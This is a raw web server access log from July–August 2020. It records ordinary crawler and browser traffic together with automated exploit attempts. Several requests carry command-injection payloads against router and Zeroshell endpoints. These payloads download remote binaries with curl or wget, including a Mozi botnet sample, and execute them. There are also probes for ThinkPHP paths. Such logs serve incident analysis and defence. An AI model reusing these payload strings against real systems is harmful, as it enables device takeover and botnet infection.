- - [31/Jul/2020:07:08:13 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 1872 "-" - "Hello, World"
- - [31/Jul/2020:09:10:37 +0000] "GET / HTTP/1.1" 200 3970 "-" - "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3602.2 Safari/537.36"
- - [31/Jul/2020:09:56:36 +0000] "GET / HTTP/1.0" 200 2443 "-" - "-"
- - [31/Jul/2020:12:09:04 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 1872 "-" - "Hello, World"
- - [31/Jul/2020:12:19:37 +0000] "CONNECT github.com:443 HTTP/1.1" 200 2387 "-" - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
- - [31/Jul/2020:12:19:38 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
- - [31/Jul/2020:13:13:01 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=busybox&curpath=/&currentsetting.htm=1 HTTP/1.1" 400 0 "-" - "Mozilla/5.0"
- - [31/Jul/2020:15:28:01 +0000] "GET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.0" 404 1835 "-" - "-"
- - [31/Jul/2020:15:28:01 +0000] "GET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.0" 404 1835 "-" - "-"
- - [31/Jul/2020:15:51:05 +0000] "GET /TP/public/index.php HTTP/1.1" 404 1835 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [31/Jul/2020:15:51:06 +0000] "GET /TP/index.php HTTP/1.1" 404 1835 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [31/Jul/2020:15:51:07 +0000] "GET /thinkphp/html/public/index.php HTTP/1.1" 404 1835 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [31/Jul/2020:15:51:07 +0000] "GET /html/public/index.php HTTP/1.1" 404 1835 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [31/Jul/2020:15:51:08 +0000] "GET /public/index.php HTTP/1.1" 404 1835 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [31/Jul/2020:15:51:09 +0000] "GET /TP/html/public/index.php HTTP/1.1" 404 1835 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [31/Jul/2020:15:51:10 +0000] "GET /elrekt.php HTTP/1.1" 404 1835 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [31/Jul/2020:15:51:10 +0000] "GET /index.php HTTP/1.1" 200 1272 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [31/Jul/2020:15:51:18 +0000] "GET / HTTP/1.1" 200 1272 "-" - "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
- - [31/Jul/2020:16:04:59 +0000] "GET / HTTP/1.1" 200 3970 "-" - "-"
- - [31/Jul/2020:16:05:00 +0000] "GET / HTTP/1.1" 200 2807 "-" - "Mozilla/5.0 zgrab/0.x"
- - [31/Jul/2020:16:37:28 +0000] "GET / HTTP/1.0" 200 2406 "-" - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
- - [31/Jul/2020:16:37:30 +0000] "GET / HTTP/1.0" 200 4431 "-" - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
- - [31/Jul/2020:16:37:31 +0000] "GET / HTTP/1.0" 200 2406 "-" - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
- - [31/Jul/2020:16:37:31 +0000] "OPTIONS / HTTP/1.0" 200 2406 "-" - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
- - [31/Jul/2020:16:37:40 +0000] "GET / HTTP/1.0" 200 4431 "-" - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
- - [31/Jul/2020:16:37:40 +0000] "OPTIONS / HTTP/1.0" 200 2406 "-" - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
- - [31/Jul/2020:16:37:40 +0000] "OPTIONS / HTTP/1.0" 200 4431 "-" - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
- - [31/Jul/2020:16:37:49 +0000] "OPTIONS / HTTP/1.0" 200 4431 "-" - "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
- - [31/Jul/2020:17:44:58 +0000] "GET / HTTP/1.1" 200 1253 "-" - "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
- - [31/Jul/2020:19:24:52 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 1872 "-" - "Hello, world"
- - [31/Jul/2020:20:55:10 +0000] "GET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.0" 404 1835 "-" - "-"
- - [31/Jul/2020:20:55:10 +0000] "GET /cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;cd%20%2Ftmp;curl%20-O%20http%3A%2F%2F5.206.227.228%2Fzero;sh%20zero;%22 HTTP/1.0" 404 1835 "-" - "-"
- - [31/Jul/2020:20:58:01 +0000] "GET / HTTP/1.0" 200 2406 "-" - "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3602.2 Safari/537.36"
- - [31/Jul/2020:21:10:39 +0000] "GET / HTTP/1.1" 200 2387 "-" - "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
- - [31/Jul/2020:22:40:22 +0000] "GET / HTTP/1.1" 200 2387 "-" - "NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com"
- - [31/Jul/2020:22:41:20 +0000] "GET / HTTP/1.1" 200 2387 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
- - [31/Jul/2020:22:41:21 +0000] "GET /robots.txt HTTP/1.1" 200 382 "-" - "-"
- - [31/Jul/2020:22:41:21 +0000] "GET /sitemap.xml HTTP/1.1" 404 1816 "-" - "-"
- - [31/Jul/2020:22:41:21 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 1816 "-" - "-"
- - [31/Jul/2020:22:41:22 +0000] "GET /favicon.ico HTTP/1.1" 200 400 "-" - "python-requests/2.22.0"
- - [31/Jul/2020:23:07:17 +0000] "GET / HTTP/1.1" 200 2387 "-" - "-"
- - [01/Aug/2020:04:08:07 +0000] "GET / HTTP/1.1" 400 0 "-" - "-"
